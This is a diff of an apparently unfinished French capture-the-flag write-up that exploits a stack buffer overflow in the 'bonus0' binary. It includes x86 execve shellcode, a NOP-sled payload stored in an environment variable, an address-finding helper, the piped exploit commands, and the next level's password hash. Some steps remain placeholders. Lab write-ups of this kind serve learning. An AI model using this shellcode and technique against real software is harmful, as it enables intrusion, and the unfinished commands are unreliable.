@@ -29,15 +29,19 @@ Le Home contient un binaire `bonus0` :
 ```
 :~$ ./bonus0
  -
-(input) test
- -
-
-:~$ ./bonus0 test
+(input)
  -
 (input)
+
+:~$ ./bonus0
+ -
+(input) test1
+ - 
+(input) test2
+test1 test2
 ```
 
-Avec ou sans paramètre, le binaire repond un ` - ` puis attends un input
+Avec ou sans paramètre, le binaire repond un ` - ` puis attends un input à 2 reprise. A la fin des 2 inputs, le binaire redonne dans l'ordre: 'input1 input2'
 
 ```
 :~$ gdb bonus0
@@ -167,5 +171,44 @@ fs             0x0      0
 gs             0x33     51
 ```
 
-L'`eip` est overwrite dans le 2eme buffer et on peux voir que son offset commence à [9](https://wiremask.eu/tools/buffer-overflow-pattern-generator/). On se rend compte aussi que l'overflow est sur le 2eme buffer, mais que ce dernier est trop petit pour y inserer notre shellcode (20 + 20 pour nos 2 buffers). Pour outrepasser ce probleme, on peux passer le shellcode dans une variable d'environnement qu'on va ensuite appeler
+L'`eip` est overwrite dans le 2eme buffer et on peux voir que son offset commence à [9](https://wiremask.eu/tools/buffer-overflow-pattern-generator/). On se rend compte aussi que l'overflow est sur le 2eme buffer, mais que ce dernier est trop petit pour y inserer notre shellcode (20 + 20 pour nos 2 buffers).
 
+Pour outrepasser ce probleme, on peux passer le shellcode dans une variable d'environnement qu'on va ensuite appeler
+
+Pour notre exploit, on va commencer par utiliser en nombre des instructions [`NOP`](https://en.wikipedia.org/wiki/NOP_(code)) qui vont nous permettre d'atteindre l'instruction qui nous interesse.
+
+```
+:~$ export EXPLOIT=`python -c 'print("\x90" * 4095 + "\n")'""`
+
+$> export EXPLOIT=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+
+
+XXXXXXXX FINIR SHELLCODE (EXPLOIT)
+```
+
+On va créer un programme pour retrouver l'addresse de variable d'environnement pour pouvoir retrouver et utiliser notre shellcode.
+
+```
+:~$ cat /tmp/getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+ 
+int main(int argc, char **argv)
+{
+	printf("Address: %p\n", getenv(argv[1]));
+   return(0);
+}
+:~$ gcc /tmp/getenv.c -o getenv; ./getenv EXPLOIT
+Address: 0xbffff94a
+
+
+
+:~$ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "EXPLOIT ADDRESS" + "\x90" * 50') > /tmp/bonus0
+:~$ cat /tmp/bonus0  - | ./bonus0
+
+:~$ (python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "EXPLOIT ADDRESS" + "\x90" * 50'; cat) | ./bonus0
+
+> cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
